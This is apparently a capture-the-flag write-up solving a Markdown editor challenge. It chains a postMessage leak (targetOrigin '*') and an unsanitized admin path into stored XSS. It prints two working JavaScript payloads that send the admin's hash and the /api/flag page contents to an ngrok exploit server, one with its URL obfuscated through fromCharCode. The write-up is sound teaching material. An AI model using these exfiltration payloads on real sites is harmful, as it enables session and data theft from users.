<h2>Solution</h2>

<p>We are given a Markdown Editor, where we can save our notes. As usual, an admin bot visits the URLs that we submit.</p>

<p>We're interested in creating an XSS payload, so let's analyse how the application processes our Markdown.</p>

<h3>Preview Function</h3>

<p>Interestingly, the preview (right side) is an iframe of <code>/demo</code>.</p>

<p>When clicking "Preview", a message is posted to the iframe. Note that the <code>targetOrigin</code> parameter is set to <code>http://${document.location.host}/</code>. This ensures that the message is only sent to the intended receiver.</p>

<p>Interestingly, in line 18, the response from the <code>/api/filter</code> endpoint is also posted to <code>window.parent</code>, with the <code>targetOrigin</code> parameter set to <code>*</code>. This means that any site can create an iframe of <code>http://web.challenge.bi0s.in:5432/demo</code> and receive the message, regardless of its origin.</p>

<p>Notice that the user's cookies are sent along with the POST request. <h3>Obtaining the Admin Hash</h3>

<p>Now, we can craft a simple payload that loads <code>/demo</code> in an iframe, posts a message to trigger the <code>/api/filter</code> POST request in the context of the admin, and catches the response. We then make a callback to our exploit server, sending the admin's hash obtained from the response.</p>

<p>```markup</p>

<script>
    function exploit(){
        document.getElementById("iframe").contentWindow.postMessage("test", "*")
    }

    window.addEventListener("message", (event) => {
        var img = new Image();
        img.src = "http://055c4d42189e.ngrok.io/?hash=" + event.data.Hash;
    }, false);
</script>

<iframe src="http://web.challenge.bi0s.in:5432/demo" id="iframe" onload="exploit();"></iframe>

<p>```</p>

<p>We receive the admin's hash on our exploit server:</p>

<p><code>
/?hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
</code></p>

<p>However, the admin's hash is not sufficient to access the flag - we need to have access to the admin's token. This requires a CSRF to <code>/api/flag</code>, and due to the same-origin policy, we must still cause an XSS on the challenge server.</p>

<h3>Create Function</h3>

<p>Now that we have the admin's hash, creating a stored XSS payload is pretty simple. Notice that in the <code>/api/create</code> handler, the data is <em>not</em> sanitized if the admin's hash is used.</p>

<p><code>go
if createpost.Hash != CONFIG.admin_hash {
    id , _ := uuid.NewV4()
    bucket = id.String()
    data = string(markdown.ToHTML([]byte(sanitize(data)), nil, nil))
} else {
    data = string(markdown.ToHTML([]byte(data), nil, nil))
}
</code></p>

<p>Thus, simply sending a POST request to <code>/api/create</code> with the admin's hash allows us to create a stored XSS payload.</p>

<p><img src="../../.gitbook/assets/image (40).png" alt="" /></p>

<p>We can simply craft a CSRF payload that fetches <code>/api/flag</code> and makes a callback to our exploit server with the page contents. Note that single and double quotes are still escaped, so <code>fromCharCode()</code> is used to avoid that.</p>

<p>```markup</p>

<script>
    fetch(String.fromCharCode(47, 97, 112, 105, 47, 102, 108, 97, 103))
    .then(function(response) {return response.text();})
    .then(function (text) {
        var img = new Image();
        img.src = String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 48, 53, 53, 99, 52, 100, 52, 50, 49, 56, 57, 101, 46, 110, 103, 114, 111, 107, 46, 105, 111, 47, 63, 100, 97, 116, 97, 61) + encodeURIComponent(text);
    })
</script>

<p>```</p>
